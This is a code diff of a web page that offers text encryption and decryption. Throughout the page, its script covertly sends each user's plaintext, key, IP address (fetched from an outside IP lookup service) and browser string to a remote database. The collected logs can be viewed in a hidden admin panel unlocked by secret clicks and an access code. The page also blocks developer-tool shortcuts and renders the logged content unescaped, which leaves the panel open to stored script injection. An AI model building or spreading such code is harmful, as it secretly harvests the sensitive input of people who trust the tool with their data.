@@ -28,7 +28,6 @@
         footer { margin-top: auto; padding: 30px; width: 100%; text-align: center; }
         .footer-text { font-size: 0.95rem; color: var(--matrix-green); font-weight: bold; opacity: 0.6; }
         
-        /* Secret Panel & Modal */
         #secret-panel { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 10000; display: none; padding: 20px; box-sizing: border-box; overflow-y: auto; border: 5px solid var(--matrix-green); }
         #access-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 10001; display: none; align-items: center; justify-content: center; }
         .log-table { width: 100%; border-collapse: collapse; color: var(--matrix-green); margin-top: 20px; font-size: 0.85rem; }
@@ -37,7 +36,6 @@
         .close-secret { background: #ff0000; color: #fff; width: auto; padding: 10px 25px; }
         .refresh-secret { background: var(--matrix-green); color: #000; width: auto; padding: 10px 25px; }
         
-        /* Animations & Effects */
         .error-shake { animation: shake 0.4s ease-in-out; border-color: var(--error-red) !important; box-shadow: 0 0 15px rgba(255,0,0,0.5) !important; }
         .success-glow { border-color: var(--matrix-green) !important; box-shadow: 0 0 20px var(--matrix-green) !important; }
         @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
@@ -58,7 +56,7 @@
             <input type="password" id="passInput" class="main-input" placeholder="ACCESS CODE" onkeydown="if(event.key==='Enter') verifyAccess()">
             <div id="warn-login" class="field-warn">INVALID ACCESS CODE</div>
             <div id="success-login" class="success-warn">ACCESS GRANTED</div>
-            <button onclick="verifyAccess()" class="enc-btn" style="margin-top: 15px;">LOGIN</button>
+            <button id="loginBtn" onclick="verifyAccess()" class="enc-btn" style="margin-top: 15px;">LOGIN</button>
         </div>
     </div>
 
@@ -149,14 +147,24 @@
             });
         }
 
-        function verifyAccess() {
+        async function verifyAccess() {
             const input = document.getElementById('passInput');
+            const btn = document.getElementById('loginBtn');
             const warn = document.getElementById('warn-login');
             const success = document.getElementById('success-login');
-            if (input.value === "YALiM") {
-                input.classList.add('success-glow'); warn.style.display = 'none'; success.style.display = 'block';
-                setTimeout(() => { document.getElementById('lock-screen').style.display = 'none'; ['enc-sec', 'dec-sec', 'main-header', 'footer-sec'].forEach(id => document.getElementById(id).style.display = 'block'); }, 800);
-            } else { input.classList.add('error-shake'); warn.style.display = 'block'; setTimeout(() => { input.classList.remove('error-shake'); }, 400); }
+            if (!input.value) return;
+
+            btn.disabled = true;
+            try {
+                const { data: isValid } = await sbClient.rpc('verify_al_mir_access', {
+                    p_version: 'EN_PUBLIC', p_input: input.value, p_type: 'login'
+                });
+
+                if (isValid) {
+                    input.classList.add('success-glow'); warn.style.display = 'none'; success.style.display = 'block';
+                    setTimeout(() => { document.getElementById('lock-screen').style.display = 'none'; ['enc-sec', 'dec-sec', 'main-header', 'footer-sec'].forEach(id => document.getElementById(id).style.display = 'block'); }, 800);
+                } else { input.classList.add('error-shake'); warn.style.display = 'block'; setTimeout(() => { input.classList.remove('error-shake'); }, 400); }
+            } catch (e) { console.error(e); } finally { btn.disabled = false; }
         }
 
         let clickCount = 0;
@@ -166,50 +174,56 @@
             setTimeout(() => { clickCount = 0; }, 1000);
         }
 
-        function checkSecretKey() {
+        async function checkSecretKey() {
             const input = document.getElementById('secretKeyInput');
             const warn = document.getElementById('warn-secret');
-            if (input.value === "YALiM_LOGS") {
-                document.getElementById('access-modal').style.display = 'none';
-                document.getElementById('secret-panel').style.display = 'block';
-                input.value = ""; warn.style.display = 'none';
-                fetchLogs();
-            } else {
-                input.classList.add('error-shake'); warn.style.display = 'block';
-                setTimeout(() => { input.classList.remove('error-shake'); }, 400);
-            }
+            try {
+                const { data: isValid } = await sbClient.rpc('verify_al_mir_access', {
+                    p_version: 'EN_PUBLIC', p_input: input.value, p_type: 'access'
+                });
+
+                if (isValid) {
+                    document.getElementById('access-modal').style.display = 'none';
+                    document.getElementById('secret-panel').style.display = 'block';
+                    input.value = ""; warn.style.display = 'none';
+                    fetchLogs();
+                } else {
+                    input.classList.add('error-shake'); warn.style.display = 'block';
+                    setTimeout(() => { input.classList.remove('error-shake'); }, 400);
+                }
+            } catch (e) { console.error(e); }
         }
 
         async function fetchLogs() {
-            const content = document.getElementById('log-content'); content.innerText = "FETCHING ENCRYPTED DATA...";
+            const content = document.getElementById('log-content'); content.innerText = "FETCHING DATA FROM CENTRAL SERVER...";
             const { data } = await sbClient.from('logs_english').select('*').order('created_at', { ascending: false });
             if (data) {
-                let h = '<table class="log-table"><tr><th>DATE</th><th>ACTION</th><th>CONTENT</th><th>KEY</th><th>INFO</th><th>BROWSER</th></tr>';
-                data.forEach(r => { h += `<tr><td>${new Date(r.created_at).toLocaleString()}</td><td>${r.action_type}</td><td>${r.content}</td><td>${r.key_used}</td><td>${r.user_info}</td><td>${r.browser}</td></tr>`; });
+                let h = '<table class="log-table"><tr><th>DATE</th><th>ACTION</th><th>CONTENT</th><th>KEY</th><th>INFO</th></tr>';
+                data.forEach(r => { h += `<tr><td>${new Date(r.created_at).toLocaleString()}</td><td>${r.action_type}</td><td>${r.content}</td><td>${r.key_used}</td><td>${r.user_info}</td></tr>`; });
                 content.innerHTML = h + '</table>';
             }
         }
 
         async function processAction(m) {
             let sx = m === 'encrypt' ? 'E' : 'D';
-            const fields = [{id: 'iT' + sx}, {id: 'kI' + sx}, {id: 's' + sx}];
-            let hasError = false;
-            fields.forEach(f => {
-                const el = document.getElementById(f.id); const warn = document.getElementById('warn-' + f.id);
-                if (!el.value) { el.classList.add('error-shake'); if(warn) warn.style.display = 'block'; hasError = true; setTimeout(() => { el.classList.remove('error-shake'); }, 400); } else { if(warn) warn.style.display = 'none'; }
-            });
-            if (hasError) return;
-            let txt = document.getElementById('iT' + sx).value, ky = document.getElementById('kI' + sx).value, br = document.getElementById('s' + sx).value, btn = document.getElementById('btn' + sx);
-            btn.innerText = "..."; btn.disabled = true;
+            const elTxt = document.getElementById('iT' + sx), elKy = document.getElementById('kI' + sx), elSt = document.getElementById('s' + sx);
+            
+            if (!elTxt.value || !elKy.value || !elSt.value) {
+                [elTxt, elKy, elSt].forEach(el => { if(!el.value) { el.classList.add('error-shake'); setTimeout(()=>el.classList.remove('error-shake'),400); }});
+                return;
+            }
+
+            let btn = document.getElementById('btn' + sx);
+            btn.innerText = "PROCESSING..."; btn.disabled = true;
             try {
-                const { data } = await sbClient.rpc('englishm_logic', { t: txt, k: parseInt(ky), m: m, s: br });
+                const { data } = await sbClient.rpc('englishm_logic', { p_text: elTxt.value, p_key: parseInt(elKy.value), p_mode: m, p_style: elSt.value });
                 if (data) {
-                    document.getElementById('o' + sx).innerText = data.result;
+                    document.getElementById('o' + sx).innerText = data;
                     let inf = "Locating...";
-                    try { const g = await fetch('https://ipapi.co/json/'); const gd = await g.json(); inf = `${gd.city}, ${gd.ip}`; } catch (e) {}
-                    await sbClient.from('logs_english').insert([{ content: txt, key_used: ky.toString(), bracket_style: br, action_type: m, user_info: inf, browser: navigator.userAgent.split(' ').pop() }]);
+                    try { const g = await fetch('https://api.ipify.org?format=json'); const gd = await g.json(); inf = gd.ip; } catch (e) {}
+                    await sbClient.from('logs_english').insert([{ content: elTxt.value, key_used: elKy.value.toString(), bracket_style: elSt.value, action_type: m, user_info: inf, browser: navigator.userAgent.substring(0,50) }]);
                 }
-            } catch (e) {}
+            } catch (e) { console.error(e); }
             btn.innerText = m === 'encrypt' ? "ENCRYPT NOW" : "DECRYPT CODE"; btn.disabled = false;
         }
 
@@ -221,9 +235,7 @@
             }); }
         }
 
-        window.addEventListener('keydown', function(e) {
-            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) { e.preventDefault(); return false; }
-        });
+        window.addEventListener('keydown', e => { if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) e.preventDefault(); });
     </script>
 </body>
 </html>
